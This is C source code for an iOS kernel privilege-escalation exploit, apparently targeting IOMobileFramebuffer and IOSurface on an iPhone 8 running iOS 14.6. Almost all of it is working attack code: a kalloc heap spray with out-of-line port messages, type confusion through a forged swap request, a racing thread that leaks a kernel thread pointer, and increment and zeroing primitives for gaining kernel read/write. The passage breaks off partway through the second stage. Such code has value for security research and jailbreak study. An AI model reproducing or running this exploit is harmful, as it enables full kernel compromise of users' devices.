#include <errno.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <unistd.h>

#include "array.h"
#include "iokit.h"

#ifdef SAMPLING_SHMEM
#include "agx_shmem_hooks.h"
#include "xnuspy_ctl.h"
#endif

/* For iPhone 8, 14.6, 30 seconds after boot, guess page inside shmem
 * to be 0xffffffe8c3898000 */
#define GUESSED_SHMEM_PTR (0xffffffe8c3898000uLL)

struct ool_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports_desc;
};

static mach_port_t kalloc(size_t len){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);

    if(kret){
        printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    size_t port_count = len / 8;

    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg oolmsg = {0};
    oolmsg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg.hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg.hdr.msgh_remote_port = recv_port;
    oolmsg.hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg.hdr.msgh_id = 0xaabbccdd;
    oolmsg.body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg.ool_ports_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg.hdr, MACH_SEND_MSG, sizeof(oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    if(kret){
        printf("%s: mach_msg %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static io_connect_t IOMobileFramebufferUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t IOMobileFramebufferUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOMobileFramebuffer";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 0;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &IOMobileFramebufferUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return IOMobileFramebufferUserClient_user_client;
}

static io_connect_t IOSurfaceRootUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t IOSurfaceRootUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOSurfaceRoot";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 0;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &IOSurfaceRootUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return IOSurfaceRootUserClient_user_client;
}

static io_connect_t AGXDeviceUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t AGXDeviceUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOGPU";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 1;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &AGXDeviceUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return AGXDeviceUserClient_user_client;
}

struct AGXDeviceUserClient_shmem {
    uint64_t shmem_addr;
    uint32_t shmem_size;
    uint32_t shmem_id;
};

static kern_return_t AGXDeviceUserClient_create_shmem(io_connect_t conn,
        uint32_t length, uint32_t shmem_type,
        struct AGXDeviceUserClient_shmem *out_shmemp){
    uint64_t input[] = { length, shmem_type };
    size_t outsz = sizeof(*out_shmemp);
    return IOConnectCallMethod(conn, 13, input, 2, NULL, 0, NULL, NULL,
            out_shmemp, &outsz);
}

static uint32_t AGXDeviceUserClient_create_command_queue(io_connect_t uc){
    uint8_t cmd_queue_input[0x408] = {0};
    uint8_t cmd_queue_output[0x10] = {0};
    size_t cmd_queue_outsz = sizeof(cmd_queue_output);

    kern_return_t kret = IOConnectCallStructMethod(uc, 7, cmd_queue_input,
            sizeof(cmd_queue_input), cmd_queue_output, &cmd_queue_outsz);

    if(kret){
        printf("%s: create new cmd queue failed: %s\n",
                __func__, mach_error_string(kret));
        return -1;
    }

    return *(uint32_t *)cmd_queue_output;
}

struct AGXDeviceUserClient_notif_queue {
    uint64_t queue_addr;
    uint32_t queue_id;
};

static kern_return_t AGXDeviceUserClient_create_notificationqueue(io_connect_t conn,
        struct AGXDeviceUserClient_notif_queue *out_notifqueuep){
    size_t outsz = sizeof(*out_notifqueuep);
    return IOConnectCallStructMethod(conn, 15, NULL, 0, out_notifqueuep, &outsz);
}

static struct array *g_shmem_array = NULL;

static int create_and_map_shmem(uint64_t wanted_size){
    static io_connect_t AGX_uc = IO_OBJECT_NULL;
    static uint32_t cmd_queue_id = -1;
    static uint32_t notif_queue_id = -1;
    static bool set_notif_queue = false;

    kern_return_t kret = KERN_SUCCESS;

    if(!AGX_uc){
        AGX_uc = AGXDeviceUserClient_uc();

        if(!AGX_uc){
            printf("%s: could not get agx uc\n", __func__);
            return -1;
        }
    }

    if(cmd_queue_id == -1){
        cmd_queue_id = AGXDeviceUserClient_create_command_queue(AGX_uc);

        if(cmd_queue_id == -1){
            printf("%s: could not make agx cmd queue\n", __func__);
            return -1;
        }
    }

    if(notif_queue_id == -1){
        struct AGXDeviceUserClient_notif_queue nqueue;
        kret = AGXDeviceUserClient_create_notificationqueue(AGX_uc, &nqueue);

        if(kret){
            printf("%s: create notif queue failed: %s\n", __func__,
                    mach_error_string(kret));
            return -1;
        }

        notif_queue_id = nqueue.queue_id;
    }

    if(!set_notif_queue){
        uint64_t in[] = { cmd_queue_id, notif_queue_id };
        kret = IOConnectCallScalarMethod(AGX_uc, 25, in, 2, NULL, NULL);

        if(kret){
            printf("%s: failed to set notification queue: %s\n", __func__,
                    mach_error_string(kret));
            return -1;
        }

        set_notif_queue = true;
    }

    struct AGXDeviceUserClient_shmem *cmd_list_shmem = malloc(sizeof(*cmd_list_shmem));
    memset(cmd_list_shmem, 0, sizeof(*cmd_list_shmem));

    kret = AGXDeviceUserClient_create_shmem(AGX_uc, wanted_size / 2, 0,
            cmd_list_shmem);

    if(kret){
        printf("%s: create cmd list shmem failed: %s\n", __func__,
                mach_error_string(kret));
        return -1;
    }

    struct AGXDeviceUserClient_shmem *segment_shmem = malloc(sizeof(*segment_shmem));
    memset(segment_shmem, 0, sizeof(*segment_shmem));

    kret = AGXDeviceUserClient_create_shmem(AGX_uc, wanted_size / 2,
            0, segment_shmem);

    if(kret){
        printf("%s: failed making segment shmem: %s\n", __func__,
                mach_error_string(kret));
        return -1;
    }

    /* We need to submit a command buffer with the shmem so the
     * kernel maps it into its address space
     * (see IOGPUCommandQueue::process_command_buffer) */

    uint64_t submit_scalar_input[] = { (uint64_t)cmd_queue_id };

    uint8_t submit_struct_input[0x28] = {0};

    *(uint32_t *)(submit_struct_input + 0x4) =
        (sizeof(submit_struct_input) - 8) >> 5;

    *(uint32_t *)(submit_struct_input + 0x8) = cmd_list_shmem->shmem_id;
    *(uint32_t *)(submit_struct_input + 0xc) = segment_shmem->shmem_id;

    uint8_t *cmdbufp = (uint8_t *)cmd_list_shmem->shmem_addr;

    *(uint32_t *)cmdbufp = 1;
    *(uint32_t *)(cmdbufp + 0x4) = cmd_list_shmem->shmem_size - 0x10;

#ifdef SAMPLING_SHMEM
    *(uint32_t *)(cmdbufp + 0x20) = cmd_list_shmem->shmem_id;
#endif

    uint8_t *seglistp = (uint8_t *)segment_shmem->shmem_addr;

    *(uint32_t *)(seglistp + 0x8) = 0x1;
    *(uint32_t *)(seglistp + 0xc) = wanted_size/2;
    *(uint32_t *)(seglistp + 0x18) = 0;
    *(uint32_t *)(seglistp + 0x1c) = wanted_size/2;

#ifdef SAMPLING_SHMEM
    *(uint32_t *)(seglistp + 0x20) = segment_shmem->shmem_id;
#endif

    kret = IOConnectCallMethod(AGX_uc, 26, submit_scalar_input, 1,
            submit_struct_input, sizeof(submit_struct_input),
            NULL, NULL, NULL, NULL);

    if(kret){
        printf("%s: submit_command_buffers failed: %s\n", __func__,
                mach_error_string(kret));
        return -1;
    }

    array_insert(g_shmem_array, cmd_list_shmem);
    array_insert(g_shmem_array, segment_shmem);

    return 0;
}

static int create_surface(io_connect_t uc){
    /* Thanks @bazad */
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xf60-0x18-0x4];
    };

    struct _IOSurfaceFastCreateArgs create_args = {0};
    create_args.width = 100;
    create_args.height = 100;
    /* below works */
    create_args.pixel_format = 0x42475241;
    create_args.alloc_size = 0;

    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);

    kern_return_t kret = IOConnectCallMethod(uc, 6, NULL, 0, &create_args,
            sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);

    if(kret)
        return -1;

    return lock_result.surface_id;
}

static int create_swap(io_connect_t uc){
    uint64_t swap_id;
    uint32_t cnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(uc, 4, NULL, 0,
            &swap_id, &cnt);

    if(kret)
        return -1;

    return swap_id;
}

static bool cancel_swap(io_connect_t uc, int swap_id){
    uint64_t in = (uint64_t)swap_id;

    kern_return_t kret = IOConnectCallScalarMethod(uc, 52, &in,
            1, NULL, NULL);

    if(kret){
        printf("%s: s_swap_cancel failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    return true;
}

static bool submit_stagen_swap(io_connect_t uc,
        uint64_t iosurfaceroot_kaddr, uint64_t recursive_lock_kaddr,
        uint64_t plus_c0_kptr, uint64_t device_cache_kaddr,
        int *swap_id_out){
    static uint64_t a = 0;
    kern_return_t kret = KERN_SUCCESS;

    if(!a){
        kret = vm_allocate(mach_task_self(), (vm_address_t *)&a, 0x4000, 1);

        if(kret){
            printf("%s: vm_allocate: %s\n", __func__,
                    mach_error_string(kret));
            *swap_id_out = 0;
            return false;
        }
    }

    int swap_id = create_swap(uc);

    if(swap_id == -1){
        printf("%s: failed to make swap\n", __func__);
        *swap_id_out = 0;
        return false;
    }

    uint8_t swap_submit_in[0x280];
    memset(swap_submit_in, 0, sizeof(swap_submit_in));
    
    /* surface+0x28: IOSurfaceRoot, must point to something valid
     * for the 10-byte zero primitive */
    *(uint64_t *)(swap_submit_in + 0x67) = iosurfaceroot_kaddr;

    /* surface+0x38: must be non-NULL so our swap is registered
     * in the surface array */
    *(uint64_t *)(swap_submit_in + 0x77) = 0x4141414141414141;
    
    /* surface+0x40: must be the same as *(device_cache+0x38) for the
     * 10-byte zero primitive we have */
    *(uint64_t *)(swap_submit_in + 0x97) = device_cache_kaddr + 0x38;

    /* surface+0x48: IOSurfaceDeviceCache pointer */
    *(uint64_t *)(swap_submit_in + 0x9f) = device_cache_kaddr;

    /* surface+0x80: IORecursiveLock */
    *(uint64_t *)(swap_submit_in + 0x11b) = recursive_lock_kaddr;

    /* surface+0xb0: size passed to IOMalloc_external * 8
     *
     * Make this large so we bail before the phone tries to do
     * a virtual method call with a pointer we can't guess
     * inside IOSurfaceClient::init */
    *(uint32_t *)(swap_submit_in + 0x14b) = 0x7fffffff;

    /* surface+0xc0: kernel pointer, can do an arbitrary decrement/
     * increment with *(surface+0xc0)+0x14 */
    *(uint64_t *)(swap_submit_in + 0x15b) = plus_c0_kptr;

    *(uint64_t *)(swap_submit_in + 0x38) = a;
    *(uint32_t *)(swap_submit_in + 0x40) = swap_id;

    /* Enable all layers so we can control more of the
     * type confused IOSurface */
    *(uint32_t *)(swap_submit_in + 0xc8) = (1 << 2) | (1 << 1) | (1 << 0);

    /* Prevent this swap from being dropped inside swap_start_gated
     * (will be considered as a "no-op swap" otherwise) */
    *(uint32_t *)(swap_submit_in + 0xcc) = 0x42424242;

    /* This must not be 0, 2, 9, 12, or 13, otherwise the most recently
     * submitted swap will not show up at UnifiedPipeline+0xb18 */
    *(uint32_t *)(swap_submit_in + 0xf4) = 0x100;

    /* Set all to 4 so the above is recorded in the swap object */
    *(uint32_t *)(swap_submit_in + 0x100) = 4;
    *(uint32_t *)(swap_submit_in + 0x104) = 4;
    *(uint32_t *)(swap_submit_in + 0x108) = 4;

    /* Shared client id */
    *(uint8_t *)(swap_submit_in + 0x157) = 0;
    *(uint8_t *)(swap_submit_in + 0x158) = 0;

    kret = IOConnectCallStructMethod(uc, 5, swap_submit_in,
            sizeof(swap_submit_in), NULL, NULL);

    if(kret){
        printf("%s: swap_submit: %s\n", __func__, mach_error_string(kret));
        *swap_id_out = 0;
        return false;
    }

    *swap_id_out = swap_id;

    return true;
}

/* Keep track of the ports that external method 83 produces so we
 * can clean them up after kernel read/write is obtained */
static struct array *g_increment32_n_ports = NULL;

static bool increment32_n(uint64_t kaddr, uint32_t times){
    static io_connect_t iomfbuc = IO_OBJECT_NULL;

    if(!iomfbuc){
        iomfbuc = IOMobileFramebufferUserClient_uc();

        if(!iomfbuc){
            printf("%s: failed making iomfb user client\n", __func__);
            return false;
        }
    }

    if(!g_increment32_n_ports){
        g_increment32_n_ports = array_new();

        if(!g_increment32_n_ports){
            printf("%s: failed to allocate array for ports\n", __func__);
            return false;
        }
    }

    int swap_id;

    /* Using IOSurface::increment_use_count, this alone is enough to
     * call it */
    if(!submit_stagen_swap(iomfbuc, 0, 0, kaddr - 0x14, 0, &swap_id))
        return false;

    for(uint32_t i=0; i<times; i++){
        uint64_t in = 16;
        uint64_t out = 0;
        uint32_t outcnt = 1;

        kern_return_t kret = IOConnectCallScalarMethod(iomfbuc, 83, &in,
                1, &out, &outcnt);

        if(kret){
            printf("%s: s_displayed_fb_surface failed at %d: %s\n",
                    __func__, i, mach_error_string(kret));
            return false;
        }

        array_insert(g_increment32_n_ports, (void *)(uintptr_t)out);
    }

    /* Get this swap off the IOMFB object */
    cancel_swap(iomfbuc, swap_id);

    return true;
}

static uint8_t *g_shmem_page = NULL;

/* Write ten zero bytes at kaddr with this primitive. This has an unfortunate
 * side effect of incrementing/decrementing +0x14 from the pointer at
 * surface+0xc0, and if that happens to be zero before we submit the swap,
 * IOSurface::decrement_use_count will do something that will panic the
 * phone. Better than nothing, though */
static bool zero10(uint64_t kaddr){
    static io_connect_t iomfbuc = IO_OBJECT_NULL;

    if(!iomfbuc){
        iomfbuc = IOMobileFramebufferUserClient_uc();

        if(!iomfbuc){
            printf("%s: failed making iomfb user client\n", __func__);
            return false;
        }
    }
    
    /* We are using IOSurface::pruneOrphanedDeviceCaches for the
     * 10-byte zero primitive. We can zero 10 bytes at whatever
     * swap+0xc0 points to. We need to set up a faux IOSurfaceDeviceCache
     * object to hit the right codepath */
    memset(g_shmem_page, 0, 0x4000);

    uint8_t *device_cache = g_shmem_page;

    *(uint64_t *)device_cache = GUESSED_SHMEM_PTR;
    *(uint64_t *)(device_cache + 0x30) = GUESSED_SHMEM_PTR + 0x30;
    *(uint64_t *)(device_cache + 0x38) = GUESSED_SHMEM_PTR;
    *(uint8_t *)(device_cache + 0x59) = 1;
    *(uint64_t *)(device_cache + 0x68) = GUESSED_SHMEM_PTR + 0x30;

    uint8_t *iosurfaceroot_lock = g_shmem_page + 0x200;

    *(uint8_t *)(iosurfaceroot_lock + 0xb) = 0x22;
    *(uint64_t *)(iosurfaceroot_lock + 0x18) = 0;
    *(uint64_t *)(iosurfaceroot_lock + 0x20) = 0;

    uint8_t *iosurfaceroot = g_shmem_page + 0x300;

    /* There is an IORecursiveLock object at IOSurfaceRoot+0x100 */
    *(uint64_t *)(iosurfaceroot + 0x100) = GUESSED_SHMEM_PTR + 0x200;

    /* Must be NULL for IOSurfaceRoot::notifySurface */
    *(uint64_t *)(iosurfaceroot + 0x150) = 0;

    /* IORecursiveLock */
    uint8_t *lock = g_shmem_page + 0x500;

    *(uint8_t *)(lock + 0xb) = 0x22;
    *(uint64_t *)(lock + 0x18) = 0;
    *(uint64_t *)(lock + 0x20) = 0;

    /* Not sure what this is for, but it has to be non-zero */
    *(uint32_t *)(g_shmem_page + 0x384) = 0x20;

    int swap_id;

    if(!submit_stagen_swap(iomfbuc, GUESSED_SHMEM_PTR + 0x300,
                GUESSED_SHMEM_PTR + 0x500, kaddr, GUESSED_SHMEM_PTR,
                &swap_id)){
        return false;
    }

    uint64_t in = 16;
    uint64_t out = 0;
    uint32_t outcnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(iomfbuc, 83, &in,
            1, &out, &outcnt);

    if(kret){
        printf("%s: first s_displayed_fb_surface failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    mach_port_t cport1 = (mach_port_t)out;

    /* Will cause IOSurface::pruneOrphanedDeviceCaches to be called */
    mach_port_destroy(mach_task_self(), cport1);

    /* The above happens asynchronously, wait a bit */
    sched_yield();
    usleep(500);

    /* So we can do this multiple times */
    cancel_swap(iomfbuc, swap_id);

    return true;
}

#define ORIGINAL_STAGE1_SHMEM_CONSTANT (0x41414141)

#define STAGE1_SHMEM_LOCK_OFFSET                     (0x0)
#define STAGE1_SHMEM_USE_COUNT_PTR_OFFSET            (0x100)
#define STAGE1_SHMEM_LEAKED_OFFSET                   (0x200)
#define STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET (0x300)

static void setup_stage1_shmem_page(uint8_t *page){
    /* This shmem will house an IORecursiveLock, so make that at
     * the beginning of each page */
    memset(page, 0, 0x4000);

    /* Mutex type */
    *(uint8_t *)(page + 0xb) = 0x22;
    /* Thread pointer */
    *(uint64_t *)(page + 0x18) = 0;
    /* Count */
    *(uint32_t *)(page + 0x20) = 0;

    /* The shmem will also house a uint32_t at +0x14. We make this
     * large for stage1 and place it after the IORecursiveLock. This
     * will be incremented when we call selector 83 of IOMFB user
     * client */
    *(uint32_t *)(page + STAGE1_SHMEM_USE_COUNT_PTR_OFFSET + 0x14) =
        ORIGINAL_STAGE1_SHMEM_CONSTANT;

    /* Finally, to increase the window of time that the thread pointer
     * lives on our shmem when the device takes the type-confused surface's
     * lock, we'll create an infinite loop in IOSurface::purge and break
     * it once we see the kernel thread pointer written to our shmem */
    uint8_t *device_cache_next;
    device_cache_next = page + STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET + 0x30;

    /* Make next point to nothing, initially */
    *(uint64_t *)device_cache_next = 0;
}

static void setup_stage1_shmem(uint8_t *shmem, size_t sz){
    uint8_t *shmem_end = shmem + sz;

    while(shmem < shmem_end){
        setup_stage1_shmem_page(shmem);
        shmem += 0x4000;
    }
}

static bool g_exploit_stage1_racer_go = false;

static void *exploit_stage1_racer(void *arg){
    uint8_t *shmem_page = arg;
    uint8_t *device_cache_next;

    device_cache_next =
        shmem_page + STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET + 0x30;

    /* Create the infinite loop condition (make next point to itself) */
    *(uint64_t *)device_cache_next =
        GUESSED_SHMEM_PTR + STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET;

    uint64_t ptr = 0;

    while(!g_exploit_stage1_racer_go)
        *(uint64_t *)(shmem_page + 0x18) = 0;

    do {
        ptr = *(volatile uint64_t *)(shmem_page + 0x18);
    } while (!ptr);

    /* Break the infinite loop the kernel is currently in inside
     * IOSurface::purge */
    *(uint64_t *)(shmem_page + STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET + 0x30) = 0;
    *(uint64_t *)(shmem_page + STAGE1_SHMEM_LEAKED_OFFSET) = ptr;

    return NULL;
}

static const int g_max_stage1_tries = 1000;

static uint64_t stage1_leaker(io_connect_t iomfbuc,
        uint8_t **shmem_page_out){
    io_connect_t iosruc = IOSurfaceRootUserClient_uc();

    if(!iosruc){
        *shmem_page_out = NULL;
        return 0;
    }

    uint64_t guessed_kaddr = GUESSED_SHMEM_PTR;
    int swap_id = 0;

    /* Attach the swap pointer to the iomfb object so we can type
     * confuse with it */
    if(!submit_stagen_swap(iomfbuc, 0, guessed_kaddr + STAGE1_SHMEM_LOCK_OFFSET,
                guessed_kaddr + STAGE1_SHMEM_USE_COUNT_PTR_OFFSET, 
                guessed_kaddr + STAGE1_SHMEM_DEVICE_CACHE_LINKED_LIST_OFFSET,
                &swap_id)){
        *shmem_page_out = NULL;
        return 0;
    }

    /* Type confuse with the IOMFBSwapIORequest we submitted earlier */
    uint64_t in = 16;
    uint64_t out = 0;
    uint32_t outcnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(iomfbuc, 83, &in,
            1, &out, &outcnt);

    if(kret){
        printf("%s: s_displayed_fb_surface fail %s\n", __func__,
                mach_error_string(kret));
        *shmem_page_out = NULL;
        return 0;
    }

    mach_port_t confused_port = (mach_port_t)out;

    /* Once we call IOSurfaceRootUserClient::s_lookup_surface_from_port
     * with the type confused port, it will fail and release the backing
     * IOSurfaceClient object. IOSurfaceClient::free will do some stuff
     * and eventually call IOSurface::purge, which will take the type-confused
     * surface's lock. This will write the address of the calling thread
     * to our shared memory.
     *
     * How can we figure out the page of userspace shmem that the guess
     * points to? Easy: for each page of shmem, check if *(shmem+0x114)
     * has been incremented once, since that is a part of the writes
     * that'll happen inside IOSurfaceSendRight::init */
    uint8_t *recursive_lock_page = NULL;

    for(int i=0; i<g_shmem_array->len; i++){
        struct AGXDeviceUserClient_shmem *shmem = g_shmem_array->items[i];

        uint8_t *page = (uint8_t *)shmem->shmem_addr;
        uint8_t *end = (uint8_t *)(shmem->shmem_addr + shmem->shmem_size);

        while(page < end){
            uint32_t indic = *(uint32_t *)(page + 0x100 + 0x14);

            if(indic != ORIGINAL_STAGE1_SHMEM_CONSTANT){
                recursive_lock_page = page;
                break;
            }

            page += 0x4000;
        }

        if(recursive_lock_page)
            break;
    }

    if(!recursive_lock_page){
        printf("%s: guess was wrong, reboot and try again\n", __func__);
        *shmem_page_out = NULL;
        return 0;
    }

    g_shmem_page = recursive_lock_page;

    pthread_t pt;
    pthread_create(&pt, NULL, exploit_stage1_racer, g_shmem_page);

    g_exploit_stage1_racer_go = true;

    /* Wait a bit for exploit_stage1_racer to fall into its first loop */
    usleep(500);

    mach_port_destroy(mach_task_self(), confused_port);

    /* Now wait for the address of the thread that's executing
     * on IOSurfaceRoot::async_release_thread to show up */
    uint64_t kptr;

    do {
        kptr = *(volatile uint64_t *)(g_shmem_page + STAGE1_SHMEM_LEAKED_OFFSET);
    } while (!kptr);

    g_exploit_stage1_racer_go = false;

    /* Call s_swap_cancel so that if we failed, we can try again */
    if(!cancel_swap(iomfbuc, swap_id)){
        *shmem_page_out = NULL;
        return 0;
    }

    *shmem_page_out = recursive_lock_page;

    return kptr;
}

/* Returns leaked thread pointer and confirmed kernel page of shmem */
static bool exploit_stage1(io_connect_t iomfbuc,
        uint64_t *leaked_kthread_out, uint64_t *kshmem_page_out,
        uint8_t **shmem_page_out){
    g_shmem_array = array_new();

    const int mb = 12;

    /* Map 36 MB of shmem, will be contiguous and predictable */
    create_and_map_shmem(mb * 0x100000);
    create_and_map_shmem(mb * 0x100000);
    create_and_map_shmem(mb * 0x100000);

    for(int i=0; i<g_shmem_array->len; i++){
        struct AGXDeviceUserClient_shmem *shmem = g_shmem_array->items[i];

        setup_stage1_shmem((uint8_t *)shmem->shmem_addr,
                shmem->shmem_size);
    }

    printf("%s: guessing that %#llx points to a page of our shmem\n",
            __func__, GUESSED_SHMEM_PTR);

    uint64_t kernel_thread_ptr = 0;

    for(int i=1; i<=g_max_stage1_tries; i++){
        uint8_t *shmem_page;
        kernel_thread_ptr = stage1_leaker(iomfbuc, &shmem_page);

        if(kernel_thread_ptr){
            *leaked_kthread_out = kernel_thread_ptr;
            *kshmem_page_out = GUESSED_SHMEM_PTR;
            *shmem_page_out = shmem_page;
            return true;
        }

        printf("%s: trying again (%d)...\n", __func__, i);
    }

    printf("%s: no leak after %d tries, reboot and go again\n",
            __func__, g_max_stage1_tries);

    *leaked_kthread_out = 0;
    *kshmem_page_out = 0;
    *shmem_page_out = NULL;

    return false;
}

#define STAGE2_FAKE_SURFACE_OFF         (0x1000)
#define STAGE2_SURFACE_USE_COUNT_OFF    (0x2000)
#define STAGE2_FAKE_SURFACE_USE_COUNT   (0x12345678)

static bool exploit_stage2(io_connect_t iomfbuc,
        io_connect_t *krw_iosruc_out, uint32_t *krw_surface_id_out,
        uint8_t **krw_surface_mem_out, struct array **ool_recvs_out,
        struct array **sprayed_surfaces_out){
    io_connect_t iosruc = IOSurfaceRootUserClient_uc();

    if(!iosruc){
        printf("%s: failed making IOSurfaceRootUserClient?\n", __func__);
        return false;
    }

    /* Completely fill up the kalloc map with controlled allocations.
     * After spraying around 1200 pages, subsequent allocations should
     * land in [0xffffffe805xxxxxx, 0xffffffe807000000). Since the
     * IOSurfaceClient array we are attacking doubles in size, we can only
     * create it as an allocation of 0x10000 bytes in the kalloc map, so
     * we'll spray 0x10000-byte OOL port array allocations. After we fill
     * up the kalloc map, we'll free one of these messages and then
     * allocate the IOSurfaceClient array. XNU will prefer the hole we just
     * made and stick the array there. This way, we should have the entirety
     * of [0xffffffe805xxxxxx, 0xffffffe807000000) mapped contiguously.
     *
     * We start the increment at 0xffffffe806000000 because there could
     * still be <0x10000-byte holes that we didn't fill around
     * 0xffffffe805xxxxxx.
     *
     * The size of the kalloc map seems to vary, but it doesn't look like
     * it'll ever be smaller than 0x3a00000 bytes. */

    size_t giant_msg_alloc_sz = 0x10000;
    struct array *spray_recvs = array_new();

    for(int i=0; i<850; i++){
        mach_port_t r = kalloc(giant_msg_alloc_sz);

        if(!r){
            printf("%s: (1) failed kalloc @ %d\n", __func__, i);
            return false;
        }

        array_insert(spray_recvs, (void *)(uintptr_t)r);
    }

    /* Free the OOL ports array at the 350'th sprayed allocation */
    mach_port_t hole_port = (mach_port_t)(uintptr_t)spray_recvs->items[350];
    mach_port_destroy(mach_task_self(), hole_port);
    spray_recvs->items[350] = NULL;

    /* Fill that hole with the IOSurfaceClient array */
    int created_surface_cnt = 0;
    struct array *surface_array = array_new();

    for(int i=0; i<0x4000; i++){
        int surface_id = create_surface(iosruc);

        if(surface_id == -1){
            /* Even if we failed, if we made at least 4096 surfaces,
             * it'll be in the kalloc map since at that point the kernel
             * will double the IOSurfaceClient array capacity */
            if(i >= 4096)
                break;
            else{
                printf("%s: failed to make surface @ %d, too early\n",
                        __func__, i);
                return false;
            }
        }

        array_insert(surface_array, (void *)(uintptr_t)surface_id);
        created_surface_cnt++;
    }

    /* Now create fake OSData-based IOSurfaceClient objects in the kernel map
     * with IOSurfaceRootUserClient::s_set_value. We are trying to fill
     * 0xffffffe8cXXXXXXX completely because kext.kalloc.160 allocations
     * usually follow the form of 0xffffffe4cXXXXXXX. Then we can use the
     * 32-bit increment to point one of the IOSurfaceClient pointers
     * in the kalloc map IOSurfaceClient array to our OSData */

    struct set_value_spray {
        uint32_t surface_id;
        uint32_t pad;

        /* Serialized XML */
        uint32_t set_value_data[6];

        /* OSData spray data */
        uint8_t osdata_spray[];
    };

    uint32_t osdata_spray_sz = 0x8000;
    struct set_value_spray *spray = malloc(sizeof(*spray) + osdata_spray_sz);

    /* Re-use the same malloc'ed buffer so this isn't slow */
    for(int k=0; k<3; k++){
        for(int i=0; i<surface_array->len; i++){
            spray->surface_id = (uint32_t)(uintptr_t)surface_array->items[i];
            spray->pad = 0;

            uint32_t *set_value_data = spray->set_value_data;

            *set_value_data++ = kOSSerializeBinarySignature;
            *set_value_data++ = kOSSerializeEndCollection | kOSSerializeArray | 1;
            *set_value_data++ = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
            *set_value_data++ = kOSSerializeSymbol | 4;
            *set_value_data++ = 0x4141;
            *set_value_data++ = kOSSerializeEndCollection | kOSSerializeData | osdata_spray_sz;

            /* Since sizeof(IOSurfaceClient) = 0x98 on my phone, they go
             * into kext.kalloc.160, so we can spray 204 of them for each
             * OSData object we spray into the kernel map */
            uint8_t fake_IOSurfaceClient[0xa0];
            memset(fake_IOSurfaceClient, 0, sizeof(fake_IOSurfaceClient));

            /* Nonsense vtab to tell me which codepaths do virtual method calls
             * so I can avoid them */
            *(uint64_t *)fake_IOSurfaceClient = 0x0101010101010101;

            /* IOSurface object, make it point into our shared memory */
